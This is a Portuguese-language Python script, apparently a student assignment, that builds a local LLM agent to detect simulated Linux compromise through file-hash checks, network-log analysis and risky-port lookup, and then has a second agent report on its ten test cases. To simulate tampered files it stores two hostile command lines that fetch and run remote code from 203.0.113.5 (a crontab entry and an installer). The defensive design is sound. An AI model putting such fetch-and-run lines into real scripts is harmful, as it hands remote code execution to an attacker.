#!/usr/bin/env python3
"""
Agente de Cibersegurança para Análise de Comprometimento de Sistema
Versão Local (Ollama) - Modelo 3B para aproveitar os 12GB de RAM do Orange Pi
Inclui Loop Duplo: Investigação + Análise Agêntica dos Resultados

Participantes: [Nome 1] e [Nome 2]
Disciplina: Tópicos Especiais em Inteligência Computacional A — IA Agêntica 2026.2

CORREÇÕES APLICADAS NESTA VERSÃO (v2), espelhando a versão API:
  1. extrair_veredicto_da_conversa tenta parsear o JSON direto da resposta do
     agente ANTES de gastar uma segunda geração com generate_structured — no
     modelo local isso é ainda mais importante, porque uma segunda passada de
     geração em CPU/ARM é cara em tempo, não só em tokens.
  2. O argumento "timeout" foi removido do LLMAPI: esta versão do agentkit
     não o aceita no construtor (TypeError). O timeout HTTP real é fixo em
     60s dentro de agentkit/model.py (função post); se precisar de mais
     tempo para gerações longas no Orange Pi, ajuste esse valor direto na
     biblioteca.
  3. Pequena pausa entre casos de teste, por segurança e para dar tempo ao
     Ollama de liberar recursos entre gerações longas.
"""

# =============================================================================
# SEÇÃO 1: IMPORTAÇÕES
# =============================================================================

import hashlib
import json
import os
import re
import time
from typing import Literal

import pandas as pd
from pydantic import BaseModel, Field

from agentkit import LLM, Agent, tool
from agentkit.model import LLMAPI

# =============================================================================
# SEÇÃO 2: MODELO (Ollama Local - Qwen 2.5 3B)
# =============================================================================

# Configurar LLMAPI para usar Ollama local (compatível com OpenAI)
# NOTA: esta versão do agentkit não expõe "timeout" no construtor do LLMAPI —
# o timeout da chamada HTTP é fixo em 60s dentro de post() (agentkit/model.py).
# Isso pode ser curto para uma geração longa em ARM; se aparecer erro de
# timeout, a correção é editar o "timeout=60" dentro de agentkit/model.py
# (função post) diretamente, e não passar o argumento aqui.
llm = LLMAPI(
    model="qwen2.5:3b",
    base_url="http://localhost:11434/v1",
    api_key="ollama",
    temperature=0.0,
    max_tokens=700,  # pequena folga extra: evita cortar a resposta no meio
)

print(f"Modelo carregado: {llm.model} (via Ollama local)")
print("⚠️  Nota: A primeira chamada pode levar 30-60s para carregar o modelo na RAM.")

# =============================================================================
# SEÇÃO 3: BASE DE DADOS SIMULADA
# =============================================================================

def _sha256(conteudo: str) -> str:
    """Calcula SHA-256 de uma string (simula o conteúdo do arquivo)."""
    return hashlib.sha256(conteudo.encode()).hexdigest()

# Conteúdos originais (estado limpo do sistema)
_CONTEUDOS_ORIGINAIS = {
    "/etc/passwd":        "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...\n",
    "/etc/shadow":        "root:$6$salt$hash_legitimo...\ndaemon: :...\n",
    "/bin/ls":            "ELF binary original ls v2.38 ",
    "/bin/bash":          "ELF binary original bash v5.2 ",
    "/usr/bin/sudo":      "ELF binary original sudo v1.9.13 ",
    "/usr/sbin/sshd":     "ELF binary original openssh-server v9.2 ",
    "/etc/crontab":       "# /etc/crontab\n17 * * * * root cd /  && run-parts /etc/cron.hourly\n",
    "/etc/hosts":         "127.0.0.1 localhost\n127.0.1.1 orangepi\n",
    "/root/.bashrc":      "# ~/.bashrc\nexport PATH=$PATH:/usr/local/bin\n",
    "/tmp/installer.sh":  "#!/bin/bash\necho 'install legítimo'\n",
}

# Hashes reais dos arquivos no momento da inspeção (alguns foram alterados)
_HASHES_REAIS = {
    "/etc/passwd":       _sha256("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...\n"),
    "/etc/shadow":       _sha256("root:$6$salt$hash_ALTERADO...\ndaemon: :...\n"),
    "/bin/ls":           _sha256("ELF binary original ls v2.38 "),
    "/bin/bash":         _sha256("ELF binary TROJANIZADO bash v5.2 "),
    "/usr/bin/sudo":     _sha256("ELF binary original sudo v1.9.13 "),
    "/usr/sbin/sshd":    _sha256("ELF binary original openssh-server v9.2 "),
    "/etc/crontab":      _sha256("# /etc/crontab\n17 * * * * root cd /  && run-parts /etc/cron.hourly\n* * * * * root curl http://203.0.113.5/c2.sh | bash\n"),
    "/etc/hosts":        _sha256("127.0.0.1 localhost\n127.0.1.1 orangepi\n"),
    "/root/.bashrc":     _sha256("# ~/.bashrc\nexport PATH=$PATH:/usr/local/bin\n"),
    "/tmp/installer.sh": _sha256("#!/bin/bash\ncurl http://203.0.113.5/malware.bin -o /tmp/.x  && chmod +x /tmp/.x  && /tmp/.x\n"),
}

# Hashes esperados (linha de base da instalação limpa)
_HASHES_BASELINE = {
    arquivo: _sha256(conteudo)
    for arquivo, conteudo in _CONTEUDOS_ORIGINAIS.items()
}

# Base de portas de risco conhecido
PORTAS_RISCO = {
    21:     "FTP — protocolo sem criptografia, vetor clássico de intrusão ",
    23:     "Telnet — protocolo sem criptografia, obsoleto e perigoso ",
    135:    "RPC/DCOM — frequentemente explorado em ataques Windows ",
    137:    "NetBIOS — exposição de compartilhamentos de rede ",
    139:    "NetBIOS/SMB — alvo de ransomware (WannaCry, NotPetya) ",
    445:    "SMB — alvo de ransomware e movimentação lateral ",
    1433:   "MSSQL — banco de dados exposto à rede ",
    3306:   "MySQL — banco de dados exposto à rede ",
    3389:   "RDP — acesso remoto Windows, alvo frequente de brute-force ",
    4444:   "Metasploit default shell — indica backdoor ativo ",
    5432:   "PostgreSQL — banco de dados exposto à rede ",
    5900:   "VNC — protocolo de desktop remoto sem criptografia ",
    6379:   "Redis — banco NoSQL geralmente sem autenticação ",
    8080:   "HTTP alternativo — pode expor serviços internos inadvertidamente ",
    27017:  "MongoDB — banco NoSQL frequentemente sem autenticação ",
    31337:  "Back Orifice / Elite — porta histórica de backdoors ",
}

print("Base de dados simulada carregada.")
print(f"  Arquivos monitorados: {len(_HASHES_REAIS)} ")
print(f"  Portas de risco mapeadas: {len(PORTAS_RISCO)} ")

# =============================================================================
# SEÇÃO 4: FERRAMENTAS DO AGENTE (FASE 1 - INVESTIGAÇÃO)
# =============================================================================
# Requisito "pelo menos três ferramentas com @tool" atendido pelas três abaixo.
# São todas leves (lookup em dicionário / comparação de string) de propósito:
# o custo computacional do agente está concentrado no modelo, não nas tools,
# o que importa especialmente rodando localmente em ARM.

@tool
def verificar_integridade_arquivo(caminho: str, hash_esperado: str) -> str:
    """Verifica se o hash SHA-256 de um arquivo bate com a baseline confiável.
    Recebe o caminho absoluto do arquivo e o hash SHA-256 que deveria ter.
    Retorna ÍNTEGRO ou COMPROMETIDO com detalhes.
    """
    hash_real = _HASHES_REAIS.get(caminho)
    if hash_real is None:
        return f"ARQUIVO_NAO_ENCONTRADO: '{caminho}' não está no inventário monitorado. "

    hash_baseline = _HASHES_BASELINE.get(caminho)

    if hash_real == hash_baseline:
        return (
            f"ÍNTEGRO: '{caminho}' — hash confere com a linha de base.\n"
            f"  Hash: {hash_real[:16]}... "
        )
    else:
        return (
            f"COMPROMETIDO: '{caminho}' — hash diverge da linha de base!\n"
            f"  Hash baseline: {hash_baseline[:16]}...\n"
            f"  Hash atual:    {hash_real[:16]}...\n"
            f"  AÇÃO RECOMENDADA: restaurar arquivo de backup limpo imediatamente. "
        )


@tool
def analisar_logs_rede(logs_json: str) -> str:
    """Analisa logs de rede em formato JSON e identifica padrões de ataque.
    Detecta brute-force (>30 req/60s na porta 22/3389), port scan (>5 portas)
    e flood/DDoS (>500 req/60s).
    """
    try:
        dados = json.loads(logs_json)
    except json.JSONDecodeError as e:
        return f"ERRO_PARSE: logs_json inválido — {e} "

    # CORREÇÃO: modelos às vezes embrulham a lista em um objeto, por exemplo
    # {"logs": [...]} em vez da lista pura [...]. Em vez de quebrar com
    # AttributeError ao iterar as chaves de um dict, desembrulha
    # automaticamente antes de processar.
    if isinstance(dados, dict):
        for chave in ("logs", "entradas", "data", "entries", "items"):
            if isinstance(dados.get(chave), list):
                dados = dados[chave]
                break

    if not isinstance(dados, list):
        return (
            "ERRO_FORMATO: logs_json precisa ser uma lista JSON de entradas, "
            'por exemplo: [{"ip": "1.2.3.4", "porta": 22, "requisicoes": 50, "protocolo": "tcp"}]. '
            "Corrija o argumento e chame a ferramenta de novo, sem explicar o erro em texto. "
        )

    entradas = dados
    if not entradas:
        return "LOGS_VAZIOS: nenhuma entrada de log fornecida. "

    alertas = []
    por_ip: dict[str, list] = {}
    for entrada in entradas:
        if not isinstance(entrada, dict):
            continue
        ip = entrada.get("ip", "? ")
        por_ip.setdefault(ip, []).append(entrada)

    PORTAS_AUTH = {22, 3389, 5900, 21, 23}

    for ip, registros in por_ip.items():
        portas_vistas = {r.get("porta") for r in registros}
        total_req = sum(r.get("requisicoes", 0) for r in registros)

        if len(portas_vistas) > 5:
            alertas.append(f"PORT_SCAN detectado de {ip}: {len(portas_vistas)} portas distintas varridas — {sorted(portas_vistas)} ")

        for registro in registros:
            porta = registro.get("porta")
            req = registro.get("requisicoes", 0)
            if porta in PORTAS_AUTH and req > 30:
                alertas.append(f"BRUTE_FORCE detectado de {ip} na porta {porta}: {req} tentativas em 60s (limiar: 30). ")

        if total_req > 500:
            alertas.append(f"FLOOD/DDoS detectado de {ip}: {total_req} requisições totais em 60s (limiar: 500). ")

    if not alertas:
        return f"TRÁFEGO_NORMAL: {len(entradas)} entradas analisadas de {len(por_ip)} IPs distintos. Nenhum padrão de ataque detectado. "

    resumo = f"ALERTAS DE REDE ({len(alertas)} detectados):\n"
    resumo += "\n".join(f"  [{i+1}] {a} " for i, a in enumerate(alertas))
    return resumo


@tool
def verificar_portas_abertas(portas_json: str) -> str:
    """Verifica quais portas abertas representam risco de segurança.
    Recebe lista JSON de inteiros e cruza com base de portas de risco.
    """
    try:
        portas = json.loads(portas_json)
        if not isinstance(portas, list):
            return "ERRO_FORMATO: esperava lista JSON de inteiros. "
    except json.JSONDecodeError as e:
        return f"ERRO_PARSE: portas_json inválido — {e} "

    portas_perigosas = []
    portas_ok = []

    for porta in portas:
        if porta in PORTAS_RISCO:
            portas_perigosas.append((porta, PORTAS_RISCO[porta]))
        else:
            portas_ok.append(porta)

    if not portas_perigosas:
        return f"PORTAS_SEGURAS: {sorted(portas_ok)} — nenhuma porta de risco detectada. "

    resultado = f"PORTAS_DE_RISCO ({len(portas_perigosas)} encontradas):\n"
    for porta, descricao in sorted(portas_perigosas):
        resultado += f"  Porta {porta}: {descricao}\n"
    if portas_ok:
        resultado += f"Portas sem risco: {sorted(portas_ok)} "
    return resultado.strip()


print("Ferramentas de investigação registradas.")

# =============================================================================
# SEÇÃO 5: NOVA FERRAMENTA (FASE 2 - ANÁLISE AGÊNTICA)
# =============================================================================

@tool
def analisar_bateria_testes(resultados_json: str) -> str:
    """Analisa o conjunto de resultados de uma bateria de testes de segurança.
    Recebe um JSON com os resultados de múltiplos casos e retorna um resumo
    estruturado para o LLM elaborar o relatório executivo.
    """
    try:
        resultados = json.loads(resultados_json)
    except json.JSONDecodeError:
        return "ERRO: JSON de resultados inválido."

    total = len(resultados)
    acertos = sum(1 for r in resultados if r.get('aprovado'))
    taxa = (acertos / total * 100) if total > 0 else 0

    erros = [r for r in resultados if not r.get('aprovado')]

    falsos_negativos = [r for r in erros if r.get('esperado') == 'COMPROMETIDO' and r.get('obtido') != 'COMPROMETIDO']
    falsos_positivos = [r for r in erros if r.get('esperado') != 'COMPROMETIDO' and r.get('obtido') == 'COMPROMETIDO']

    resumo = f"""DADOS DA BATERIA DE TESTES:
- Total de casos: {total}
- Taxa de acerto: {taxa:.1f}% ({acertos}/{total})
- Falsos Negativos (Crítico - deixou passar ameaça): {len(falsos_negativos)}
- Falsos Positivos (Alerta desnecessário): {len(falsos_positivos)}

LISTA DE CASOS REPROVADOS:
"""
    for e in erros:
        resumo += f"- Caso {e['id']} ({e['dificuldade']}): Esperava '{e['esperado']}', obteve '{e['obtido']}'. Justificativa do agente: {e.get('justificativa', 'N/A')[:100]}\n"

    return resumo


print("Ferramenta de análise agêntica registrada.")

# =============================================================================
# SEÇÃO 6: ESTADO, PROMPT E SAÍDA ESTRUTURADA
# =============================================================================
# Requisito "memória/estado" atendido pelo dicionário `estado`, que acumula
# evidências entre chamadas de ferramenta e é injetado de volta no prompt de
# sistema a cada rodada via montar_system/estado_para_texto.

def novo_estado() -> dict:
    return {
        "arquivos_comprometidos": [],
        "arquivos_integros": [],
        "alertas_rede": [],
        "portas_perigosas": [],
        "ferramentas_usadas": [],
    }

def atualizar_estado(estado: dict, nome_ferramenta: str, resultado: str) -> None:
    estado["ferramentas_usadas"].append(nome_ferramenta)
    if nome_ferramenta == "verificar_integridade_arquivo":
        if "COMPROMETIDO" in resultado:
            arquivo = resultado.split("'")[1] if "'" in resultado else "desconhecido"
            estado["arquivos_comprometidos"].append(arquivo)
        elif "ÍNTEGRO" in resultado:
            arquivo = resultado.split("'")[1] if "'" in resultado else "desconhecido"
            estado["arquivos_integros"].append(arquivo)
    elif nome_ferramenta == "analisar_logs_rede":
        if "ALERTAS" in resultado or "detectado" in resultado:
            linhas = [l.strip() for l in resultado.splitlines() if "detectado" in l.lower()]
            estado["alertas_rede"].extend(linhas)
    elif nome_ferramenta == "verificar_portas_abertas":
        if "PORTAS_DE_RISCO" in resultado:
            linhas = [l.strip() for l in resultado.splitlines() if "Porta" in l]
            estado["portas_perigosas"].extend(linhas)

def estado_para_texto(estado: dict) -> str:
    partes = ["ESTADO DA INVESTIGAÇÃO ATUAL:"]
    partes.append(f"  Ferramentas usadas: {estado['ferramentas_usadas'] or 'nenhuma ainda'} ")
    partes.append(f"  Arquivos comprometidos: {estado['arquivos_comprometidos'] or 'nenhum'} ")
    partes.append(f"  Arquivos íntegros verificados: {len(estado['arquivos_integros'])} ")
    partes.append(f"  Alertas de rede: {estado['alertas_rede'] or 'nenhum'} ")
    partes.append(f"  Portas perigosas: {estado['portas_perigosas'] or 'nenhuma'} ")
    return "\n".join(partes)

# Requisito "planejamento e reflexão" atendido pelas REGRAS DE INVESTIGAÇÃO
# abaixo (que definem a ordem/critério de uso das ferramentas) combinadas ao
# estado injetado a cada chamada: o modelo vê o que já apurou e decide se
# precisa de mais uma ferramenta antes de fechar o veredicto (regra 5).
SYSTEM_BASE = """Você é um agente especialista em cibersegurança e análise forense de sistemas Linux.

Sua tarefa é investigar se um sistema está comprometido. Para isso você tem acesso a três ferramentas:
- verificar_integridade_arquivo: verifica se um arquivo foi modificado
- analisar_logs_rede: detecta padrões de ataque no tráfego de rede
- verificar_portas_abertas: identifica portas abertas com riscos de segurança

REGRAS DE INVESTIGAÇÃO:
1. Use todas as ferramentas relevantes para os dados fornecidos antes de concluir.
2. Para cada arquivo mencionado na tarefa, chame verificar_integridade_arquivo.
3. Se logs de rede forem fornecidos, chame analisar_logs_rede.
4. Se portas abertas forem fornecidas, chame verificar_portas_abertas.
5. Acumule todas as evidências antes de emitir o veredicto final.
6. Quando terminar a investigação, responda com um JSON exatamente neste formato,
   e nada mais além dele (sem texto antes ou depois):
   {{"status": "SISTEMA SEGURO" | "ALERTA" | "COMPROMETIDO",
     "confianca": <0-100>,
     "justificativa": "<uma frase curta, no máximo 20 palavras>"}}

FORMATO EXATO DOS ARGUMENTOS DAS FERRAMENTAS (siga literalmente):
- analisar_logs_rede(logs_json='[{{"ip": "1.2.3.4", "porta": 22, "requisicoes": 50, "protocolo": "tcp"}}]')
  Passe a lista JSON diretamente. NUNCA embrulhe em outro objeto como {{"logs": [...]}}.
- verificar_portas_abertas(portas_json='[22, 80, 443]')
  Passe a lista JSON de inteiros diretamente.
- verificar_integridade_arquivo(caminho='/bin/bash', hash_esperado='<hash exato da tarefa>')

SE UMA FERRAMENTA RETORNAR ERRO:
Não escreva nenhuma explicação em texto sobre o erro. Apenas corrija o argumento
no formato acima e chame a mesma ferramenta de novo imediatamente.

CRITÉRIOS DE VEREDICTO:
- COMPROMETIDO: qualquer arquivo crítico adulterado (/bin/bash, /etc/shadow, /etc/crontab, etc.),
  OR porta 4444/31337 aberta, OR brute-force bem-sucedido evidente.
- ALERTA: arquivos não-críticos alterados, OR portas de risco abertas sem outro indicador,
  OR padrões de ataque na rede sem evidência de comprometimento de arquivos.
- SISTEMA SEGURO: nenhuma evidência de comprometimento em qualquer vetor.

{estado} """

def montar_system(estado: dict) -> str:
    return SYSTEM_BASE.format(estado=estado_para_texto(estado))

# Requisito "saída estruturada" atendido por este schema Pydantic, usado tanto
# no parse direto quanto no fallback via generate_structured.
class Veredicto(BaseModel):
    status: Literal["SISTEMA SEGURO", "ALERTA", "COMPROMETIDO"]
    confianca: int = Field(ge=0, le=100, description="Confiança no veredicto, de 0 a 100")
    justificativa: str = Field(description="Explicação concisa das evidências encontradas")

print("Estado, prompt e esquema de saída configurados.")

# =============================================================================
# SEÇÃO 7: LAÇO DO AGENTE (FASE 1)
# =============================================================================

FERRAMENTAS_INVESTIGACAO = [verificar_integridade_arquivo, analisar_logs_rede, verificar_portas_abertas]


def extrair_veredicto_da_conversa(messages: list[dict], llm: LLMAPI) -> Veredicto | None:
    """Extrai o veredicto estruturado da conversa.

    CORREÇÃO: parse direto do JSON primeiro (sem custo de geração); só recorre
    a generate_structured — uma segunda passada de geração, cara em ARM — se
    o parse direto falhar.
    """
    ultima_resposta = ""
    for m in reversed(messages):
        if m.get("role") == "assistant" and m.get("content"):
            ultima_resposta = m["content"]
            break

    if not ultima_resposta:
        return None

    # 1) Parse direto — sem chamada extra ao modelo.
    match = re.search(r'\{[^{}]+\}', ultima_resposta, re.DOTALL)
    if match:
        try:
            return Veredicto.model_validate_json(match.group())
        except Exception:
            pass

    # 2) Fallback: pede ao modelo para formalizar o veredicto.
    prompt_extracao = [
        {"role": "system", "content": "Extraia o veredicto de segurança do texto abaixo e retorne exatamente o JSON solicitado. status deve ser um de: 'SISTEMA SEGURO', 'ALERTA', 'COMPROMETIDO'."},
        {"role": "user", "content": ultima_resposta},
    ]

    try:
        return llm.generate_structured(prompt_extracao, Veredicto, max_tokens=300)
    except Exception:
        return None


def investigar(tarefa: str, verbose: bool = False) -> tuple[Veredicto | None, dict]:
    """Executa a investigação completa: decisão dinâmica de ferramentas (Agent),
    atualização do estado a cada observação, e extração do veredicto final.
    """
    estado = novo_estado()
    messages = [
        {"role": "system", "content": montar_system(estado)},
        {"role": "user", "content": tarefa},
    ]

    # Requisito "decisão dinâmica": max_steps limita, mas é o próprio modelo
    # que escolhe quais das três ferramentas chamar, em que ordem e quando
    # parar de chamar ferramentas e responder com o veredicto.
    agent = Agent(llm, FERRAMENTAS_INVESTIGACAO, max_steps=12)
    messages = agent.run(messages)

    for i, m in enumerate(messages):
        if m.get("role") == "tool":
            for prev in reversed(messages[:i]):
                if prev.get("role") == "assistant" and prev.get("tool_calls"):
                    nome = prev["tool_calls"][0]["name"]
                    atualizar_estado(estado, nome, m["content"])
                    break

    if verbose:
        print("\n--- TRAÇO DA INVESTIGAÇÃO ---")
        for m in messages:
            role = m.get("role", "? ")
            if role == "user" and m.get("content"):
                print(f"[user] {m['content'][:100]}... ")
            elif role == "assistant" and m.get("tool_calls"):
                for call in m["tool_calls"]:
                    args_str = str(call.get("arguments", {}))[:80]
                    print(f"[tool_call] {call['name']}({args_str}) ")
            elif role == "assistant" and m.get("content"):
                print(f"[assistant] {m['content'][:120]} ")
            elif role == "tool":
                print(f"  -> {m['content'][:100]} ")
        print("--- FIM DO TRAÇO ---\n")

    veredicto = extrair_veredicto_da_conversa(messages, llm)
    return veredicto, estado

print("Laço do agente de investigação configurado.")

# =============================================================================
# SEÇÃO 8: CASOS DE TESTE
# =============================================================================

CASOS_DE_TESTE = [
    {"id": 1, "descricao": "Arquivo crítico (/bin/bash) comprometido", "tarefa": "Verifique a integridade do arquivo /bin/bash. Hash esperado: " + _sha256("ELF binary original bash v5.2 "), "esperado": "COMPROMETIDO", "dificuldade": "simples"},
    {"id": 2, "descricao": "Arquivo não-crítico íntegro (/etc/hosts)", "tarefa": "Verifique a integridade do arquivo /etc/hosts. Hash esperado: " + _sha256("127.0.0.1 localhost\n127.0.1.1 orangepi\n"), "esperado": "SISTEMA SEGURO", "dificuldade": "simples"},
    {"id": 3, "descricao": "Porta de backdoor (4444) aberta", "tarefa": "As seguintes portas estão abertas no sistema: [22, 80, 443, 4444]. Verifique se há riscos.", "esperado": "COMPROMETIDO", "dificuldade": "simples"},
    {"id": 4, "descricao": "Logs com brute-force SSH", "tarefa": "Analise os logs: " + json.dumps([{"ip": "198.51.100.77", "porta": 22, "requisicoes": 847, "protocolo": "tcp"}]), "esperado": "ALERTA", "dificuldade": "simples"},
    {"id": 5, "descricao": "Crontab adulterado + port scan", "tarefa": "Investigue: (1) /etc/crontab (hash: " + _sha256("# /etc/crontab\n17 * * * * root cd /  && run-parts /etc/cron.hourly\n") + "). (2) Logs: " + json.dumps([{"ip": "203.0.113.10", "porta": p, "requisicoes": 5, "protocolo": "tcp"} for p in [22, 80, 443, 3306, 8080, 27017]]), "esperado": "COMPROMETIDO", "dificuldade": "intermediário"},
    {"id": 6, "descricao": "Portas de risco + arquivo íntegro", "tarefa": "Verifique: (1) Portas: [22, 80, 3306, 6379]. (2) /etc/hosts (hash: " + _sha256("127.0.0.1 localhost\n127.0.1.1 orangepi\n") + ").", "esperado": "ALERTA", "dificuldade": "intermediário"},
    {"id": 7, "descricao": "Múltiplos arquivos comprometidos + logs limpos", "tarefa": "Investigue: (1) /etc/shadow (hash: " + _sha256("root:$6$salt$hash_legitimo...\ndaemon:*:...\n") + "), /bin/bash (hash: " + _sha256("ELF binary original bash v5.2 ") + "). (2) Logs: " + json.dumps([{"ip": "192.168.1.20", "porta": 80, "requisicoes": 45, "protocolo": "tcp"}]) + ". (3) Portas: [22, 80, 443].", "esperado": "COMPROMETIDO", "dificuldade": "complexo"},
    {"id": 8, "descricao": "Sistema limpo (mas com porta 8080)", "tarefa": "Investigue: (1) /etc/passwd, /etc/hosts, /usr/bin/sudo (hashes originais). (2) Logs normais. (3) Portas: [22, 80, 443, 8080].", "esperado": "ALERTA", "dificuldade": "complexo"},
    {"id": 9, "descricao": "[DESAFIADOR] /tmp/installer.sh malicioso + logs ambíguos", "tarefa": "Análise forense: (1) /tmp/installer.sh (hash: " + _sha256("#!/bin/bash\necho 'install legítimo'\n") + "). (2) Logs: " + json.dumps([{"ip": "203.0.113.5", "porta": 31337, "requisicoes": 18, "protocolo": "tcp"}, {"ip": "10.0.0.100", "porta": 22, "requisicoes": 850, "protocolo": "tcp"}]) + ". (3) Portas: [22, 80, 443, 31337].", "esperado": "COMPROMETIDO", "dificuldade": "desafiador"},
    {"id": 10, "descricao": "[DESAFIADOR] Mix de arquivos + flood externo + backdoor", "tarefa": "Investigação completa: (1) /bin/ls, /bin/bash, /usr/sbin/sshd, /etc/crontab (hashes originais). (2) Logs: " + json.dumps([{"ip": "198.51.100.200", "porta": 80, "requisicoes": 712, "protocolo": "tcp"}]) + ". (3) Portas: [22, 80, 443, 3306, 4444].", "esperado": "COMPROMETIDO", "dificuldade": "desafiador"},
]

print(f"{len(CASOS_DE_TESTE)} casos de teste configurados.")

# =============================================================================
# SEÇÃO 9: EXECUÇÃO DOS TESTES (FASE 1)
# =============================================================================

# Pequena pausa de segurança entre casos, por consistência com a versão API
# e para dar folga ao Ollama entre gerações longas.
PAUSA_ENTRE_CASOS_SEGUNDOS = 1

resultados = []

for indice_caso, caso in enumerate(CASOS_DE_TESTE):
    print(f"\n{'='*70} ")
    print(f"CASO {caso['id']:2d} [{caso['dificuldade']:12s}] — {caso['descricao']} ")
    print(f"{'='*70} ")

    try:
        veredicto, estado = investigar(caso["tarefa"], verbose=True)
    except Exception as e:
        print(f"ERRO: {e}")
        veredicto, estado = None, novo_estado()

    status_obtido = veredicto.status if veredicto else "ERRO_PARSE"
    confianca = veredicto.confianca if veredicto else 0
    justificativa = veredicto.justificativa if veredicto else "Não foi possível extrair o veredicto. "
    aprovado = (status_obtido == caso["esperado"])

    print(f"Esperado : {caso['esperado']} ")
    print(f"Obtido   : {status_obtido} (confiança: {confianca}%) ")
    print(f"Status   : {'✅ APROVADO' if aprovado else '❌ REPROVADO'} ")

    resultados.append({
        "id": caso["id"], "descricao": caso["descricao"], "dificuldade": caso["dificuldade"],
        "esperado": caso["esperado"], "obtido": status_obtido, "confianca": confianca,
        "aprovado": aprovado, "ferramentas": estado["ferramentas_usadas"], "justificativa": justificativa,
    })

    if indice_caso < len(CASOS_DE_TESTE) - 1:
        time.sleep(PAUSA_ENTRE_CASOS_SEGUNDOS)

# Tabela rápida
df = pd.DataFrame(resultados)
print("\n📊 TABELA DE RESULTADOS (Fase 1)\n")
print(df[["id", "dificuldade", "esperado", "obtido", "confianca", "aprovado"]].to_string(index=False))

total = len(df)
acertos = df["aprovado"].sum()
taxa = acertos / total * 100 if total else 0
print(f"\n{'='*50} ")
print(f"TAXA DE ACERTO GLOBAL: {acertos}/{total} = {taxa:.1f}% ")
print(f"{'='*50} ")

erros = df[~df["aprovado"]]
if len(erros) > 0:
    print(f"\n❌ CASOS REPROVADOS ({len(erros)}): ")
    for _, linha in erros.iterrows():
        print(f"  Caso {linha['id']:2d}: esperado '{linha['esperado']}', obtido '{linha['obtido']}' ")
        print(f"         Justificativa: {str(linha['justificativa'])[:150]} ")
else:
    print("\n✅ Todos os casos aprovados! ")

# =============================================================================
# SEÇÃO 10: ANÁLISE AGÊNTICA DOS RESULTADOS (FASE 2 - LOOP DUPLO)
# =============================================================================

print(f"\n{'='*70} ")
print("INICIANDO FASE 2: ANÁLISE AGÊNTICA DOS RESULTADOS ")
print(f"{'='*70} ")

resultados_json = json.dumps(resultados, indent=2, ensure_ascii=False)

tarefa_analise = f"""
Você é um Analista Sênior de Segurança da Informação.
Analise os dados brutos da bateria de testes de segurança abaixo e elabore um RELATÓRIO EXECUTIVO.

DADOS BRUTOS:
{resultados_json}

SUA TAREFA (Use a ferramenta 'analisar_bateria_testes' para processar os dados e depois gere o relatório):
1. Identifique os padrões de falha do agente de investigação.
2. Classifique a severidade dos erros (Falsos Negativos são críticos em segurança).
3. Forneça 3 recomendações técnicas para melhorar o agente (ex: ajustar prompts, adicionar ferramentas, mudar thresholds).
4. Gere um Resumo Executivo de no máximo 5 linhas para a diretoria de TI.
"""

FERRAMENTAS_ANALISE = [analisar_bateria_testes]
agent_analista = Agent(llm, FERRAMENTAS_ANALISE, max_steps=4)

messages_analise = [
    {"role": "system", "content": "Você é um Analista Sênior de Segurança. Use as ferramentas fornecidas para processar dados e gerar relatórios técnicos claros e acionáveis."},
    {"role": "user", "content": tarefa_analise},
]

print("⏳ Agente analisando resultados (isso pode levar alguns segundos com o modelo local)...")
try:
    messages_analise = agent_analista.run(messages_analise)
except Exception as e:
    print(f"ERRO na fase de análise: {e}")
    messages_analise = []

print("\n--- 📝 RELATÓRIO EXECUTIVO (Gerado pelo Agente) ---")
for m in messages_analise:
    if m.get("role") == "assistant" and m.get("content"):
        print(m["content"])
print("--- FIM DO RELATÓRIO ---\n")

print("✅ Script executado do início ao fim. Ambos os loops agênticos concluídos.")
